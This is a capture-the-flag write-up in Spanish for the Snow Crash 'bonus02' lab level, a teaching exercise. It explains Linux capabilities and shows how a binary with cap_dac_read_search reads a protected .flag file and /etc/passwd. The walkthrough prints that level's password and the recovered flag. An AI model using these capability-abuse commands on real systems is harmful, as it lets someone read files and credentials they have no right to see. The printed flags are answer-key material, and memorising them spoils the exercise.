# Bonus02 — Snow Crash

> **Nivel bonus** · Linux capabilities · `cap_dac_read_search` · Lector privilegiado

| | |
|---|---|
| **Proyecto** | Snow Crash (42) |
| **Nivel** | `bonus02` |
| **Usuario de entrada** | `bonus02` |
| **Objetivo** | Credencial de `flagbonus02` |
| **Idea central** | Binario `mafia` con capability de lectura DAC |

---

<a id="indice"></a>

## 📋 Índice

1. 🧭 [¿De qué va este nivel? (visión general)](#sec-1)
2. 🗺️ [Mapa mental del ataque](#sec-2)
3. 📖 [Glosario rápido](#sec-3)
4. 🏷️ [Tipo de ejercicio](#sec-4)
5. 🎯 [Objetivo](#sec-5)
6. 🔑 [Acceso al nivel](#sec-6)
7. 🔍 [Localizar el componente del nivel](#sec-7)
8. 🔐 [Capabilities: la clave del nivel](#sec-8)
9. 📄 [Uso del programa](#sec-9)
10. 🧪 [Pruebas de comportamiento](#sec-10)
11. ✅ [Obtener la flag](#sec-11)
12. 🏁 [Credencial final](#sec-12)
13. ⌨️ [Resumen de comandos válidos](#sec-13)
14. 💡 [Conceptos importantes](#sec-14)
15. 📦 [Conclusión](#sec-15)
16. 📁 [Estructura recomendada en el repositorio](#sec-16)
17. 📚 [Para seguir aprendiendo](#sec-17)
18. 🩹 [Errores frecuentes y qué significan](#sec-err)

> **Tip de navegación:** al final de cada sección encontrarás un enlace **↑ Volver al índice**.

---

<a id="sec-1"></a>

## 1. 🧭 ¿De qué va este nivel? (visión general)

Piensa en un **lector de documentos** que tiene una llave especial: puede abrir
cualquier armario de solo lectura aunque tu tarjeta de empleado no baste.
Ese lector es el binario `mafia` con la capability **`cap_dac_read_search`**.

Tú no eres `flagbonus02`, pero puedes **ejecutar** `mafia` porque perteneces al
grupo `bonus02_grp`. Le pasas la ruta del documento secreto y el programa lo
imprime por stdout.

No hace falta setuid: la capability basta.

**Otra analogía:** las capabilities son como **llaves maestras de un solo tipo**.
Root tiene el llavero completo. `cap_dac_read_search` es solo la llave de
“abrir y mirar dentro”, no la de “cambiar la cerradura” ni la de “conducir el
coche de empresa”. Por eso el programa puede *leer* el `.flag` pero no te
convierte en administrador del sistema.


<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-2"></a>

## 2. 🗺️ Mapa mental del ataque

```text
  [bonus02]  ∈  grupo bonus02_grp
        │
        ▼
  /opt/snowcrash/bonus02/mafia
     mode 750, owner flagbonus02, group bonus02_grp
     cap_dac_read_search=ep
        │
        │  open(path) + read + write(stdout)
        ▼
  /home/flagbonus02/.flag  →  stdout  →  flag
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-3"></a>

## 3. 📖 Glosario rápido

| Término | Analogía cotidiana | Qué es en la práctica |
|---------|-------------------|------------------------|
| **Capability** | Llave de una sola habitación | Privilegio fino sin ser root completo |
| **`cap_dac_read_search`** | “Puedo mirar en cualquier armario” | Omite comprobaciones DAC al abrir/buscar |
| **DAC** | Cerraduras normales de ficheros | Bits rwx de usuario/grupo/otros |
| **setuid** | Ponerse el gafete de otra persona | Cambia el UID efectivo (aquí **no** se usa) |
| **`getcap` / `setcap`** | Leer o asignar llaves a un programa | Consulta/asignación de capabilities en ficheros |
| **Grupo `bonus02_grp`** | Club que puede usar el lector | Controla quién ejecuta el binario (modo 750) |

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-4"></a>

## 4. 🏷️ Tipo de ejercicio

Lectura privilegiada de ficheros mediante un binario con la capability Linux
**`cap_dac_read_search`**, que permite eludir las comprobaciones DAC al abrir rutas.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-5"></a>

## 5. 🎯 Objetivo

Obtener la credencial asociada a `flagbonus02` / al siguiente nivel bonus.

El programa `mafia` no tiene bit **setuid**, pero sí la capability
`cap_dac_read_search=ep`. Eso le permite abrir y leer ficheros a los que el
usuario `bonus02` no tendría acceso por permisos normales (por ejemplo
`/home/flagbonus02/.flag`).

La pista del home de `bonus02` es:

```text
The Mafia keeps its books in order. Always.
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-6"></a>

## 6. 🔑 Acceso al nivel

```bash
ssh bonus02@localhost -p 2424
```

Contraseña (flag de bonus01):

```text
fa6v5ateaw21peobuub8ipe6s
```

```bash
whoami
id
pwd
ls -la
cat README
```

Debes ver el grupo **`bonus02_grp`** (`4010` o similar).

```bash
getent passwd flagbonus02
# ...:/usr/sbin/nologin
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-7"></a>

## 7. 🔍 Localizar el componente del nivel

```bash
ls -laR /opt/snowcrash/bonus02
ls -l /opt/snowcrash/bonus02/mafia
file /opt/snowcrash/bonus02/mafia
```

```text
-rwxr-x--- 1 flagbonus02 bonus02_grp 16328 ... mafia
ELF 64-bit LSB pie executable, ... not stripped
```

Como `bonus02` está en `bonus02_grp`, **puede ejecutar** el programa. No hay
servicio systemd específico de bonus02: el vector está en el propio ejecutable.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-8"></a>

## 8. 🔐 Capabilities: la clave del nivel

```bash
getcap /opt/snowcrash/bonus02/mafia
stat /opt/snowcrash/bonus02/mafia
```

```text
/opt/snowcrash/bonus02/mafia cap_dac_read_search=ep
```

| Elemento | Explicación |
|----------|-------------|
| `cap_dac_read_search` | Omite comprobaciones de **lectura** y de **búsqueda en directorios** (DAC) |
| `e` (effective) | La capability está activa al ejecutarse |
| `p` (permitted) | Está en el conjunto permitido del binario |

Efecto: al lanzar `mafia`, el proceso puede abrir ficheros que `bonus02` no
podría leer con `cat` normal.

```bash
ls -la /home/flagbonus02 2>&1
# Permission denied
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-9"></a>

## 9. 📄 Uso del programa

```bash
/opt/snowcrash/bonus02/mafia
```

```text
usage: /opt/snowcrash/bonus02/mafia <document-path>
```

Cadenas del binario:

```text
usage: %s <document-path>
mafia: %s: %s
mafia: write error: %s
mafia: read error: %s
```

Símbolos: `open`, `read`, `write`, `close`, `strerror`.

Comportamiento de `main` (resumen):

1. Si `argc != 2` → imprime usage y sale.
2. `open(argv[1], O_RDONLY)`.
3. Bucle: `read` (hasta 0x1000) → `write` a **stdout** (fd 1).
4. Errores con `strerror`.

En la práctica es un **`cat` con `cap_dac_read_search`**.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-10"></a>

## 10. 🧪 Pruebas de comportamiento

```bash
/opt/snowcrash/bonus02/mafia /etc/hostname
# snowcrash

/opt/snowcrash/bonus02/mafia /etc/passwd 2>&1 | head -5

/opt/snowcrash/bonus02/mafia /home/flagbonus02/
# mafia: read error: Is a directory
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-11"></a>

## 11. ✅ Obtener la flag

```bash
/opt/snowcrash/bonus02/mafia /home/flagbonus02/.flag
```

```text
cfiioecfib9aobid1abfa0ci8
```

**Por qué funciona**

1. `bonus02` no puede hacer `cat` del `.flag` (permisos del home).
2. Al lanzar `mafia`, el kernel aplica `cap_dac_read_search`.
3. `open` del `.flag` tiene éxito.
4. El contenido se escribe en stdout.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-12"></a>

## 12. 🏁 Credencial final

```text
cfiioecfib9aobid1abfa0ci8
```

Guardar en `bonus02/flag`. Contraseña de `bonus03`:

```bash
ssh bonus03@localhost -p 2424
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-13"></a>

## 13. ⌨️ Resumen de comandos válidos

```bash
ssh bonus02@localhost -p 2424
ls -la; cat README
ls -l /opt/snowcrash/bonus02/mafia
getcap /opt/snowcrash/bonus02/mafia
strings -a /opt/snowcrash/bonus02/mafia
/opt/snowcrash/bonus02/mafia /home/flagbonus02/.flag
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-14"></a>

## 14. 💡 Conceptos importantes

- Linux capabilities como privilegios finos independientes del UID 0
- `cap_dac_read_search` no otorga escritura ni ejecución arbitraria
- `getcap` / `setcap` (`=ep` = effective + permitted)
- Diferencia con setuid: aquí el UID sigue siendo el del usuario
- El grupo controla **quién ejecuta**; la capability controla **qué puede leer**

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-15"></a>

## 15. 📦 Conclusión

No se modifica la OVA. Localizar `mafia`, confirmar ejecución por grupo,
detectar `cap_dac_read_search=ep` y leer el `.flag`. Credencial:

```text
cfiioecfib9aobid1abfa0ci8
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-16"></a>

## 16. 📁 Estructura recomendada en el repositorio

```text
bonus02/
├── flag
└── resources/
    └── bonus02.md
```

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<a id="sec-17"></a>

## 17. 📚 Para seguir aprendiendo

| Tema | Pista |
|------|--------|
| Capabilities | `man capabilities`, `man getcap` |
| DAC vs capabilities | modelos de control de acceso en Linux |

Hilo común: el privilegio está en el binario; tú solo lo invocas con la ruta adecuada.

<p align="right"><a href="#indice">↑ Volver al índice</a></p>


---

<a id="sec-err"></a>

## 18. 🩹 Errores frecuentes y qué significan

Cuando algo “no funciona”, casi siempre el mensaje del sistema apunta a una
causa concreta. Esta tabla resume los síntomas más habituales de **bonus02**,
qué suelen querer decir y el siguiente comando o acción razonable.

| Síntoma | Causa probable | Qué hacer |
|---------|----------------|-----------|
| `Permission denied` al hacer `cat` del `.flag` | DAC normal: no eres `flagbonus02` | **Esperado.** Usa `mafia`, no `cat`. |
| `mafia: ...: Permission denied` | ¿Sin capability? ¿ruta mal? | Comprueba `getcap .../mafia` → debe ser `cap_dac_read_search=ep`. |
| `usage: mafia <document-path>` | Falta el argumento | Pasa la ruta: `.../mafia /home/flagbonus02/.flag`. |
| `mafia: read error: Is a directory` | Pasaste un directorio, no un fichero | Usa el path del **fichero** `.flag`. |
| No puedes ejecutar `mafia` | No estás en `bonus02_grp` | `id` debe listar `bonus02_grp`; si no, revisa el login. |
| `getcap` vacío | Capabilities no asignadas o binario distinto | Confirma ruta `/opt/snowcrash/bonus02/mafia`. |

**Cómo usarla:** localiza la fila que más se parezca a lo que ves en pantalla,
aplica la acción sugerida y, si el síntoma cambia, vuelve a consultar la tabla
(a menudo un error se resuelve y aparece el siguiente de la lista).

<p align="right"><a href="#indice">↑ Volver al índice</a></p>

---

<div align="center">

**42 Málaga** — **rdel-olm & sternero** — **Octubre 2026**

*Snow Crash · bonus02 · material didáctico de resolución*

</div>
